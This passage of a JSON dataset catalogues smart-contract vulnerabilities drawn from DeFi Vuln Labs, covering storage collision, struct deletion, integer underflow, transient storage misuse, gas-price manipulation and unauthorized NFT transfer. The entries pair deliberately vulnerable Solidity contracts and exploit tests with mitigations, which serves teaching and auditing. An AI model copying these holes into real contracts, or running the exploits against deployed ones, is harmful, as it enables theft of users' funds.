 require(value <= _allowed[from][msg.sender]);\n        require(to != address(0));\n\n        _balances[from] = _balances[from].sub(value);\n\n        uint256 tokensToBurn = cut(value);\n        uint256 tokensToTransfer = value.sub(tokensToBurn);\n\n        _balances[to] = _balances[to].add(tokensToTransfer);\n        _totalSupply = _totalSupply.sub(tokensToBurn);\n\n        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);\n\n        emit Transfer(from, to, tokensToTransfer);\n        emit Transfer(from, address(0), tokensToBurn);\n\n        return true;\n    }\n\n    function upAllowance(\n        address spender,\n        uint256 addedValue\n    ) public returns (bool) {\n        require(spender != address(0));\n        _allowed[msg.sender][spender] = (\n            _allowed[msg.sender][spender].add(addedValue)\n        );\n        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n        return true;\n    }\n\n    function downAllowance(\n        address spender,\n        uint256 subtractedValue\n    ) public returns (bool) {\n        require(spender != address(0));\n        _allowed[msg.sender][spender] = (\n            _allowed[msg.sender][spender].sub(subtractedValue)\n        );\n        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n        return true;\n    }\n\n    function _issue(address account, uint256 amount) internal {\n        require(amount != 0);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    }\n\n    function destroy(uint256 amount) external {\n        _destroy(msg.sender, amount);\n    }\n\n    function _destroy(address account, uint256 amount) internal {\n        require(amount != 0);\n        require(amount <= _balances[account]);\n        _totalSupply = _totalSupply.sub(amount);\n        _balances[account] = _balances[account].sub(amount);\n        emit Transfer(account, address(0), amount);\n    }\n\n    function destroyFrom(address account, uint256 amount) external {\n        require(amount <= _allowed[account][msg.sender]);\n        _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(\n            amount\n        );\n        _destroy(account, amount);\n    }\n}\n\n//vulnerable vault\ncontract VulnVault {\n    mapping(address => uint256) private balances;\n    uint256 private fee;\n    IERC20 private token;\n\n    event Deposit(address indexed depositor, uint256 amount);\n    event Withdrawal(address indexed recipient, uint256 amount);\n\n    constructor(address _tokenAddress) {\n        token = IERC20(_tokenAddress);\n    }\n\n    function deposit(uint256 amount) external {\n        require(amount > 0, \"Deposit amount must be greater than zero\");\n\n        token.transferFrom(msg.sender, address(this), amount);\n        balances[msg.sender] += amount;\n        emit Deposit(msg.sender, amount);\n    }\n\n    function withdraw(uint256 amount) external {\n        require(amount > 0, \"Withdrawal amount must be greater than zero\");\n        require(amount <= balances[msg.sender], \"Insufficient balance\");\n\n        balances[msg.sender] -= amount;\n        token.transfer(msg.sender, amount);\n        emit Withdrawal(msg.sender, amount);\n    }\n\n    function getBalance(address account) external view returns (uint256) {\n        return balances[account];\n    }\n}\n\n//Mitigated vault\ncontract Vault {\n    mapping(address => uint256) private balances;\n    uint256 private fee;\n    IERC20 private token;\n\n    event Deposit(address indexed depositor, uint256 amount);\n    event Withdrawal(address indexed recipient, uint256 amount);\n\n    constructor(address _tokenAddress) {\n        token = IERC20(_tokenAddress);\n    }\n\n    function deposit(uint256 amount) external {\n        require(amount > 0, \"Deposit amount must be greater than zero\");\n\n        uint256 balanceBefore = token.balanceOf(address(this));\n\n        token.transferFrom(msg.sender, address(this), amount);\n\n        uint256 balanceAfter = token.balanceOf(address(this));\n        uint256 actualDepositAmount = balanceAfter - balanceBefore;\n\n        balances[msg.sender] += actualDepositAmount;\n        emit Deposit(msg.sender, actualDepositAmount);\n    }\n\n    function withdraw(uint256 amount) external {\n        require(amount > 0, \"Withdrawal amount must be greater than zero\");\n        require(amount <= balances[msg.sender], \"Insufficient balance\");\n\n        balances[msg.sender] -= amount;\n        token.transfer(msg.sender, amount);\n        emit Withdrawal(msg.sender, amount);\n    }\n\n    function getBalance(address account) external view returns (uint256) {\n        return balances[account];\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/fee-on-transfer.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "storage-collision",
    "slug": "storage-collision",
    "title": "Storage Collision Vulnerability",
    "description": "The vulnerability is that both the Proxy and Logic contracts use the same storage slot (slot 0) to store important variables,\nnamely the implementation address in the Proxy contract and the GuestAddress in the Logic contract. \nSince the Proxy contract is using the delegatecall method to interact with the Logic contract, \nthey share the same storage. If the foo function is called,\nit overwrites the implementation address in the Proxy contract, which results in an unexpected behavior.",
    "mitigation": "One approach to mitigating this issue is to design the storage layout of the proxy and logic contracts to be consistent with each other.\n\nREF:\nhttps://blog.openzeppelin.com/proxy-patterns",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Storage Collision Vulnerability\n\nDescription:\nThe vulnerability is that both the Proxy and Logic contracts use the same storage slot (slot 0) to store important variables,\nnamely the implementation address in the Proxy contract and the GuestAddress in the Logic contract. \nSince the Proxy contract is using the delegatecall method to interact with the Logic contract, \nthey share the same storage. If the foo function is called,\nit overwrites the implementation address in the Proxy contract, which results in an unexpected behavior.\n\nMitigation:\nOne approach to mitigating this issue is to design the storage layout of the proxy and logic contracts to be consistent with each other.\n\nREF:\nhttps://blog.openzeppelin.com/proxy-patterns\n*/\n\ncontract ContractTest is Test {\n    Logic LogicContract;\n    Proxy ProxyContract;\n\n    function testStorageCollision() public {\n        LogicContract = new Logic();\n        ProxyContract = new Proxy(address(LogicContract));\n\n        console.log(\n            \"Current implementation contract address:\",\n            ProxyContract.implementation()\n        );\n        ProxyContract.testcollision();\n        console.log(\n            \"overwritten slot0 implementation contract address:\",\n            ProxyContract.implementation()\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract Proxy {\n    address public implementation; //slot0\n\n    constructor(address _implementation) {\n        implementation = _implementation;\n    }\n\n    function testcollision() public {\n        bool success;\n        (success, ) = implementation.delegatecall(\n            abi.encodeWithSignature(\"foo(address)\", address(this))\n        );\n    }\n}\n\ncontract Logic {\n    address public GuestAddress; //slot0\n\n    constructor() {\n        GuestAddress = address(0x0);\n    }\n\n    function foo(address _addr) public {\n        GuestAddress = _addr;\n    }\n}\n",
    "severity": "Medium",
    "category": "Logic Error",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Storage-collision.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "storage-collision-audio",
    "slug": "storage-collision-audio",
    "title": "Storage-collision-audio",
    "description": "No description provided.",
    "mitigation": "No mitigation provided.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\n\n// We take Audius as an example. For more details, you can refer to Audius Governance Takeover Post-Mortem 7/23/22 and Remediation.\n// https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22\n\ninterface ILogic {\n    function getguardianAddress() external returns (address);\n\n    function getproxyAdmin() external returns (address);\n\n    function initialize(address) external;\n\n    function getinitializing() external returns (bool);\n\n    function getinitialized() external returns (bool);\n\n    function isConstructor() external view returns (bool);\n}\n\ncontract ContractTest is Test {\n    Logic LogicContract;\n    TestProxy ProxyContract;\n\n    function testStorageCollision() public {\n        LogicContract = new Logic();\n        ProxyContract = new TestProxy(\n            address(LogicContract),\n            address(msg.sender),\n            address(this)\n        );\n\n        console.log(\n            \"Current guardianAddress:\",\n            ILogic(address(ProxyContract)).getguardianAddress()\n        );\n        console.log(\n            \"Current initializing boolean:\",\n            ILogic(address(ProxyContract)).getinitializing()\n        );\n        console.log(\n            \"Current initialized boolean:\",\n            ILogic(address(ProxyContract)).getinitialized()\n        );\n        console.log(\"Try to call initialize to change guardianAddress\");\n        ILogic(address(ProxyContract)).initialize(address(msg.sender));\n\n        console.log(\n            \"After initializing, changed guardianAddress to attacker:\",\n            ILogic(address(ProxyContract)).getguardianAddress()\n        );\n        console.log(\n            \"After initializing,  initializing boolean is still true:\",\n            ILogic(address(ProxyContract)).getinitializing()\n        );\n        console.log(\n            \"After initializing,  initialized boolean:\",\n            ILogic(address(ProxyContract)).getinitialized()\n        );\n\n        /*\nIn this case because the last byte of the proxyAdmin address is `0x72`, initialized was interpreted as a truthy value. \nSimilarly, because the second byte of the proxyAdmin address is `0xea`, \ninitializing was also interpreted as a truthy value. This caused the initializer() modifier to always succeed:\n*/\n\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract TestProxy is TransparentUpgradeableProxy {\n    address private proxyAdmin; // slot 0 - storage collision here\n\n    constructor(\n        address _logic,\n        address _admin,\n        address guardianAddress\n    )\n        TransparentUpgradeableProxy(\n            _logic,\n            _admin,\n            abi.encodeWithSelector(\n                bytes4(0xc4d66de8), // bytes4(keccak256(\"initialize(address)\"))\n                guardianAddress\n            )\n        )\n    {\n        proxyAdmin = _admin;\n    }\n}\n\ncontract Initializable {\n    /**\n     * @dev Indicates that the contract has been initialized.\n     */\n    bool private initialized;\n\n    /**\n     * @dev Indicates that the contract is in the process of being initialized.\n     */\n    bool private initializing;\n\n    /**\n     * @dev Modifier to use in the initializer function of a contract.\n     */\n    modifier initializer() {\n        require(\n            initializing || isConstructor() || !initialized,\n            \"Contract instance has already been initialized\"\n        );\n\n        bool isTopLevelCall = !initializing;\n        if (isTopLevelCall) {\n            initializing = true;\n            initialized = true;\n        }\n\n        _;\n\n        if (isTopLevelCall) {\n            initializing = false;\n        }\n    }\n\n    /// @dev Returns true if and only if the function is running in the constructor\n    function isConstructor() private view returns (bool) {\n        // extcodesize checks the size of the code stored in an address, and\n        // address returns the current address. Since the code is still not\n        // deployed when running a constructor, any checks on its code size will\n        // yield zero, making it an effective way to detect if a contract is\n        // under construction or not.\n        address self = address(this);\n        uint256 cs;\n        assembly {\n            cs := extcodesize(self)\n        }\n        return cs == 0;\n    }\n\n    // Reserved storage space to allow for layout changes in the future.\n    uint256[50] private ______gap;\n\n    function getinitializing() public view returns (bool) {\n        return initializing;\n    }\n\n    function getinitialized() public view returns (bool) {\n        return initialized;\n    }\n}\n\ncontract Logic is Initializable {\n    address private guardianAddress;\n\n    function initialize(address _guardianAddress) public initializer {\n        guardianAddress = _guardianAddress; //Guardian address becomes the only party\n    }\n\n    function getguardianAddress() public view returns (address) {\n        return guardianAddress;\n    }\n}\n",
    "severity": "Medium",
    "category": "Logic Error",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Storage-collision-audio.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "struct-deletion",
    "slug": "struct-deletion",
    "title": "Struct Deletion Oversight",
    "description": "Incomplete struct deletion leaves residual data. \nIf you delete a struct containing a mapping, the mapping won't be deleted.\n\nThe bug arises because Solidity's delete keyword does not reset the storage to its \ninitial state but rather performs a partial reset. \nWhen delete  myStructs[structId] is called, \nit only resets the id at mappingId to its default value 0, \nbut the other flags in the mapping remain unchanged. Therefore,\nif the struct is deleted without deleting the mapping inside, \nthe remaining flags will persist in storage.",
    "mitigation": "To fix this bug, you should delete the mapping inside the struct before deleting the struct itself.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1676836264245592065\nhttps://docs.soliditylang.org/en/develop/types.html",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Struct Deletion Oversight\n\nDescription:\nIncomplete struct deletion leaves residual data. \nIf you delete a struct containing a mapping, the mapping won't be deleted.\n\nThe bug arises because Solidity's delete keyword does not reset the storage to its \ninitial state but rather performs a partial reset. \nWhen delete  myStructs[structId] is called, \nit only resets the id at mappingId to its default value 0, \nbut the other flags in the mapping remain unchanged. Therefore,\nif the struct is deleted without deleting the mapping inside, \nthe remaining flags will persist in storage.\n\nMitigation:  \nTo fix this bug, you should delete the mapping inside the struct before deleting the struct itself.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1676836264245592065\nhttps://docs.soliditylang.org/en/develop/types.html\n*/\n\ncontract ContractTest is Test {\n    StructDeletionBug StructDeletionBugContract;\n    FixedStructDeletion FixedStructDeletionContract;\n\n    function setUp() public {\n        StructDeletionBugContract = new StructDeletionBug();\n        FixedStructDeletionContract = new FixedStructDeletion();\n    }\n\n    function testStructDeletion() public {\n        StructDeletionBugContract.addStruct(10, 10);\n        StructDeletionBugContract.getStruct(10, 10);\n        StructDeletionBugContract.deleteStruct(10);\n        StructDeletionBugContract.getStruct(10, 10);\n    }\n\n    function testFixedStructDeletion() public {\n        FixedStructDeletionContract.addStruct(10, 10);\n        FixedStructDeletionContract.getStruct(10, 10);\n        FixedStructDeletionContract.deleteStruct(10);\n        FixedStructDeletionContract.getStruct(10, 10);\n    }\n\n    receive() external payable {}\n}\n\ncontract StructDeletionBug {\n    struct MyStruct {\n        uint256 id;\n        mapping(uint256 => bool) flags;\n    }\n\n    mapping(uint256 => MyStruct) public myStructs;\n\n    function addStruct(uint256 structId, uint256 flagKeys) public {\n        MyStruct storage newStruct = myStructs[structId];\n        newStruct.id = structId;\n        newStruct.flags[flagKeys] = true;\n    }\n\n    function getStruct(\n        uint256 structId,\n        uint256 flagKeys\n    ) public view returns (uint256, bool) {\n        MyStruct storage myStruct = myStructs[structId];\n        bool keys = myStruct.flags[flagKeys];\n        return (myStruct.id, keys);\n    }\n\n    function deleteStruct(uint256 structId) public {\n        MyStruct storage myStruct = myStructs[structId];\n        delete myStructs[structId];\n    }\n}\n\ncontract FixedStructDeletion {\n    struct MyStruct {\n        uint256 id;\n        mapping(uint256 => bool) flags;\n    }\n\n    mapping(uint256 => MyStruct) public myStructs;\n\n    function addStruct(uint256 structId, uint256 flagKeys) public {\n        MyStruct storage newStruct = myStructs[structId];\n        newStruct.id = structId;\n        newStruct.flags[flagKeys] = true;\n    }\n\n    function getStruct(\n        uint256 structId,\n        uint256 flagKeys\n    ) public view returns (uint256, bool) {\n        MyStruct storage myStruct = myStructs[structId];\n        bool keys = myStruct.flags[flagKeys];\n        return (myStruct.id, keys);\n    }\n\n    function deleteStruct(uint256 structId) public {\n        MyStruct storage myStruct = myStructs[structId];\n        // Check if all flags are deleted, then delete the mapping\n        for (uint256 i = 0; i < 15; i++) {\n            delete myStruct.flags[i];\n        }\n        delete myStructs[structId];\n    }\n}\n",
    "severity": "Medium",
    "category": "Uncategorized",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Struct-deletion.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "overflow2",
    "slug": "overflow2",
    "title": "Token Whale Overflow Vulnerability",
    "description": "This contract demonstrates an integer underflow vulnerability in an ERC20 token contract. \nThe vulnerability exists in the implementation of the transferFrom function. Due to the lack \nof automatic overflow checking in Solidity versions before 0.8.0, attackers can exploit \nthis vulnerability to generate a large amount of tokens.\n\nHow it works:\n1. Contract initializes with deployer receiving 1000 tokens\n2. Deployer transfers 800 tokens to Alice\n3. Alice approves the attacker to spend 1000 tokens\n4. Attacker uses transferFrom to transfer 500 tokens from Alice to Bob\n5. Due to the lack of overflow checking in the _transfer function's subtraction operation, \n   an underflow occurs when Alice's balance is insufficient\n6. The underflow causes Alice's balance to become an extremely large number, \n   effectively creating tokens out of thin air\n\nImpact: \n- Affects contracts using Solidity < 0.8.0\n- Contracts not using SafeMath library",
    "mitigation": "1. Use Solidity 0.8.0 or later which has built-in overflow checking\n2. Use SafeMath library for older versions\n3. Properly validate balances before transfers\n\nThis vulnerability demonstrates why proper integer overflow/underflow protection is crucial \nin smart contract development, particularly in token contracts where numerical operations \nare frequent and critical to the contract's security.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Token Whale Overflow Vulnerability\n\nDescription:\nThis contract demonstrates an integer underflow vulnerability in an ERC20 token contract. \nThe vulnerability exists in the implementation of the transferFrom function. Due to the lack \nof automatic overflow checking in Solidity versions before 0.8.0, attackers can exploit \nthis vulnerability to generate a large amount of tokens.\n\nHow it works:\n1. Contract initializes with deployer receiving 1000 tokens\n2. Deployer transfers 800 tokens to Alice\n3. Alice approves the attacker to spend 1000 tokens\n4. Attacker uses transferFrom to transfer 500 tokens from Alice to Bob\n5. Due to the lack of overflow checking in the _transfer function's subtraction operation, \n   an underflow occurs when Alice's balance is insufficient\n6. The underflow causes Alice's balance to become an extremely large number, \n   effectively creating tokens out of thin air\n\nImpact: \n- Affects contracts using Solidity < 0.8.0\n- Contracts not using SafeMath library\n\nMitigation:\n1. Use Solidity 0.8.0 or later which has built-in overflow checking\n2. Use SafeMath library for older versions\n3. Properly validate balances before transfers\n\nThis vulnerability demonstrates why proper integer overflow/underflow protection is crucial \nin smart contract development, particularly in token contracts where numerical operations \nare frequent and critical to the contract's security.\n*/\n\ncontract ContractTest is Test {\n    TokenWhaleChallenge TokenWhaleChallengeContract;\n\n    function testOverflow2() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n\n        TokenWhaleChallengeContract = new TokenWhaleChallenge();\n        TokenWhaleChallengeContract.TokenWhaleDeploy(address(this));\n        console.log(\n            \"Player balance:\",\n            TokenWhaleChallengeContract.balanceOf(address(this))\n        );\n        TokenWhaleChallengeContract.transfer(address(alice), 800);\n\n        vm.prank(alice);\n        TokenWhaleChallengeContract.approve(address(this), 1000);\n        TokenWhaleChallengeContract.transferFrom(\n            address(alice),\n            address(bob),\n            500\n        ); //exploit here\n\n        console.log(\"Exploit completed, balance overflowed\");\n        console.log(\n            \"Player balance:\",\n            TokenWhaleChallengeContract.balanceOf(address(this))\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract TokenWhaleChallenge {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 1000;\n        balanceOf[player] = 1000;\n    }\n\n    function isComplete() public view returns (bool) {\n        return balanceOf[player] >= 1000000;\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n\n        emit Transfer(msg.sender, to, value);\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    function approve(address spender, uint256 value) public {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    }\n\n    function transferFrom(address from, address to, uint256 value) public {\n        require(balanceOf[from] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n        require(allowance[from][msg.sender] >= value);\n\n        allowance[from][msg.sender] -= value;\n        _transfer(to, value);\n    }\n}\n",
    "severity": "Medium",
    "category": "Arithmetic",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Overflow2.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "transient-storage-misuse-t",
    "slug": "transient-storage-misuse-t",
    "title": "TransientStorageMisuse.t",
    "description": "No description provided.",
    "mitigation": "No mitigation provided.",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\n\n/*\nSIR (Storage Injection via Reentrancy) vulnerability transient storage test\nReference: https://www.coveragelabs.io/blog/post/sir-exploit\nSolidity 0.8.24+ transient storage\n*/\n\n// Simplified transient storage vulnerability demonstration\n\ncontract SimpleVault {\n    // mint function\n    function mint(uint256 amountToDeposit) external returns (uint256) {\n        // Write vault address (address(this)) to transient storage\n        address vault = address(this);\n        assembly {\n            tstore(1, vault)\n        }\n        \n        // Directly call own callback function\n        this.SwapCallback(amountToDeposit, \"\");\n        \n    }\n    \n    // Simulate SwapCallback callback function\n    function SwapCallback(uint256 amount ,bytes calldata data) external {\n        // Read vault address from transient storage\n        address vault;\n        assembly {\n            vault := tload(1)\n        }\n\n        // Check if caller is a legitimate vault\n        require(msg.sender == vault, \"Not authorized\");\n        \n        if (vault == address(this)) {\n            // Output vault address for observation\n            console.log(\"vault address:\", vault);\n            // Write the returned amount to transient storage\n            assembly {\n                tstore(1, amount)\n            }\n        } else {\n            console.log(\"Manipulated vault address:\", vault);\n        }\n    }\n\n}\n\ncontract TransientStorageMisuseTest is Test {\n    SimpleVault vault;\n    \n    function setUp() public {\n        vault = new SimpleVault();\n    }\n\n\n    function testStorageExploit() public {\n        // First, let's check what address we want to get\n        console.log(\"Target address:\", address(this));\n        \n        // Convert the address to uint256\n        uint256 amount = uint256(uint160(address(this)));\n        emit log_named_uint(\"Amount needed\", amount);\n        \n        // Now use this amount in the mint function\n        vault.mint(amount);\n        // Exploit callback\n        vault.SwapCallback(0, \"\");\n    }\n}\n",
    "severity": "Medium",
    "category": "Reentrancy",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/TransientStorageMisuse.t.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "gas-price",
    "slug": "gas-price",
    "title": "txGasPrice manipulation",
    "description": "Manipulation of the txGasPrice value, which can result in unintended consequences and potential financial losses.\n\nIn the calculateTotalFee function, the total fee is calculated by multiplying gasUsed + GAS_OVERHEAD_NATIVE with txGasPrice. \nThe issue is that the txGasPrice value can be manipulated by an attacker, potentially leading to an inflated fee calculation.",
    "mitigation": "To address this vulnerability, it is recommended to implement safeguards such as using a gas oracle to obtain the average gas price from a trusted source. \n\nTest:\nforge test --contracts src/test/gas-price.sol  -vvvv --gas-price 200000000000000\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1678268482641870849\nhttps://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-03-21-Alligator.md\nhttps://github.com/solodit/solodit_content/blob/main/reports/Trust%20Security/2023-05-15-Brahma.md\nhttps://blog.pessimistic.io/ethereum-alarm-clock-exploit-final-thoughts-21334987c331",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: txGasPrice manipulation\n\nDescription:\nManipulation of the txGasPrice value, which can result in unintended consequences and potential financial losses.\n\nIn the calculateTotalFee function, the total fee is calculated by multiplying gasUsed + GAS_OVERHEAD_NATIVE with txGasPrice. \nThe issue is that the txGasPrice value can be manipulated by an attacker, potentially leading to an inflated fee calculation.\n\nMitigation:  \nTo address this vulnerability, it is recommended to implement safeguards such as using a gas oracle to obtain the average gas price from a trusted source. \n\nTest:\nforge test --contracts src/test/gas-price.sol  -vvvv --gas-price 200000000000000\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1678268482641870849\nhttps://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-03-21-Alligator.md\nhttps://github.com/solodit/solodit_content/blob/main/reports/Trust%20Security/2023-05-15-Brahma.md\nhttps://blog.pessimistic.io/ethereum-alarm-clock-exploit-final-thoughts-21334987c331\n*/\n\ncontract ContractTest is Test {\n    GasReimbursement GasReimbursementContract;\n\n    function setUp() public {\n        GasReimbursementContract = new GasReimbursement();\n        vm.deal(address(GasReimbursementContract), 100 ether);\n    }\n\n    function testGasRefund() public {\n        uint balanceBefore = address(this).balance;\n        GasReimbursementContract.executeTransfer(address(this));\n        uint balanceAfter = address(this).balance - tx.gasprice; // --gas-price 200000000000000\n        console.log(\"Profit\", balanceAfter - balanceBefore);\n    }\n\n    receive() external payable {}\n}\n\ncontract GasReimbursement {\n    uint public gasUsed = 100000; // Assume gas used is 100,000\n    uint public GAS_OVERHEAD_NATIVE = 500; // Assume native token gas overhead is 500\n\n    // uint public txGasPrice = 20000000000;  // Assume transaction gas price is 20 gwei\n\n    function calculateTotalFee() public view returns (uint) {\n        uint256 totalFee = (gasUsed + GAS_OVERHEAD_NATIVE) * tx.gasprice;\n        return totalFee;\n    }\n\n    function executeTransfer(address recipient) public {\n        uint256 totalFee = calculateTotalFee();\n        _nativeTransferExec(recipient, totalFee);\n    }\n\n    function _nativeTransferExec(address recipient, uint256 amount) internal {\n        payable(recipient).transfer(amount);\n    }\n}\n",
    "severity": "Medium",
    "category": "Oracle",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/gas-price.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "nft-transfer",
    "slug": "nft-transfer",
    "title": "Unauthorized NFT Transfer in custom ERC721 implementation.",
    "description": "Custom transferFrom function in contract VulnerableERC721, \ndoes not properly check if msg.sender is the current owner of the token or an approved address.\nAs a result, any address can call the transferFrom function to transfer any token, \nregardless of who the current owner is. \nThis allows unauthorized users to transfer tokens they do not own, leading to potential theft of assets.",
    "mitigation": "To ensure that msg.sender is the current owner of the token or an approved address.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1679120390281412609\nhttps://blog.decurity.io/scanning-for-vulnerable-erc721-implementations-fe19200b91b5\nhttps://ventral.digital/posts/2022/8/18/sznsdaos-bountyboard-unauthorized-transferfrom-vulnerability\nhttps://github.com/pessimistic-io/slitherin/blob/master/docs/nft_approve_warning.md",
    "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n/*\nName: Unauthorized NFT Transfer in custom ERC721 implementation.\n\nDescription:\nCustom transferFrom function in contract VulnerableERC721, \ndoes not properly check if msg.sender is the current owner of the token or an approved address.\nAs a result, any address can call the transferFrom function to transfer any token, \nregardless of who the current owner is. \nThis allows unauthorized users to transfer tokens they do not own, leading to potential theft of assets.\n\n \nMitigation:  \nTo ensure that msg.sender is the current owner of the token or an approved address.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1679120390281412609\nhttps://blog.decurity.io/scanning-for-vulnerable-erc721-implementations-fe19200b91b5\nhttps://ventral.digital/posts/2022/8/18/sznsdaos-bountyboard-unauthorized-transferfrom-vulnerability\nhttps://github.com/pessimistic-io/slitherin/blob/master/docs/nft_approve_warning.md\n*/\n\ncontract ContractTest is Test {\n    VulnerableERC721 VulnerableERC721Contract;\n    FixedERC721 FixedERC721Contract;\n    address alice = vm.addr(1);\n    address bob = vm.addr(2);\n\n    function setUp() public {\n        VulnerableERC721Contract = new VulnerableERC721();\n        VulnerableERC721Contract.safeMint(alice, 1);\n        FixedERC721Contract = new FixedERC721();\n        FixedERC721Contract.safeMint(alice, 1);\n    }\n\n    function testVulnerableERC721() public {\n        VulnerableERC721Contract.ownerOf(1);\n        vm.prank(bob);\n        VulnerableERC721Contract.transferFrom(address(alice), address(bob), 1);\n\n        console.log(VulnerableERC721Contract.ownerOf(1));\n    }\n\n    function testFixedERC721() public {\n        FixedERC721Contract.ownerOf(1);\n        vm.prank(bob);\n        vm.expectRevert();\n        FixedERC721Contract.transferFrom(address(alice), address(bob), 1);\n        console.log(VulnerableERC721Contract.ownerOf(1));\n    }\n\n    receive() external payable {}\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) external pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n\ncontract VulnerableERC721 is ERC721, Ownable {\n    constructor() ERC721(\"MyNFT\", \"MNFT\") {}\n\n    //custom transferFrom function which missing NFT owner check.\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public override {\n        // direct transfer\n        _transfer(from, to, tokenId);\n    }\n\n    function safeMint(address to, uint256 tokenId) public onlyOwner {\n        _safeMint(to, tokenId);\n    }\n}\n\ncontract FixedERC721 is ERC721, Ownable {\n    constructor() ERC721(\"MyNFT\", \"MNFT\") {}\n\n    //Mitigation: add token owner check\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public override {\n        require(\n            _isApprovedOrOwner(_msgSender(), tokenId),\n            \"ERC721: caller is not token owner or approved\"\n        );\n\n        _transfer(from, to, tokenId);\n    }\n\n    function safeMint(address to, uint256 tokenId) public onlyOwner {\n        _safeMint(to, tokenId);\n    }\n    /*\n    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) {\n        address owner = ERC721.ownerOf(tokenId);\n        return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);\n    }\n*/\n}\n",
    "severity": "Medium",
    "category": "Access Control",
    "standard": "General",
    "source": {
      "name": "DeFi Vuln Labs",
      "url": "https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/NFT-transfer.sol",
      "repo": "https://github.com/SunWeb3Sec/DeFiVulnLabs"
    }
  },
  {
    "id": "returnvalue",
    "slug": "returnvalue",
    "title": "Unchecked return value",
